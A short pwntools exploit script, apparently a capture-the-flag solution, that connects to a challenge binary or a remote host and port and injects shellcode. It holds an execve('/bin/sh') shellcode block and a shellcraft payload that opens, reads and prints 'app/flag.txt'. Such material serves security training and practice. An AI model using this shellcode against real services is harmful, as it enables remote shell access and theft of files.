#!/usr/bin/env python3

from pwn import *

context.arch = 'amd64'

PATH = 'app/chall'

HOST = '103.167.136.89'
PORT = 10023

GDBSCRIPT = '''
set resolve-heap-via-heuristic on
b *main+212
'''

def debug(r):
    if type(r) == process:
        gdb.attach(r, GDBSCRIPT)

def exploit(r):
    shellcode = '''
        mov rax, 0x68732f6e69622f
        push rax
        mov rdi, rsp
        xor rsi, rsi
        xor rdx, rdx
        mov rax, 0x3b
        syscall
    '''
    
    # debug(r)
    # pause()
    
    shellcode  = shellcraft.open('app/flag.txt', 0)
    shellcode += shellcraft.read(3, 'rsp', 0x100)
    shellcode += shellcraft.write(1, 'rsp', 0x100)
    
    r.sendlineafter(b'Enter your shellcode:\n', asm(shellcode))
    r.interactive()

if __name__ == '__main__':
    elf = ELF(PATH, checksec=True)
    
    # libc = elf.libc
    if args.REMOTE:
        r = remote(HOST, PORT)
    else:
        r = elf.process(aslr=False, env={})
    exploit(r)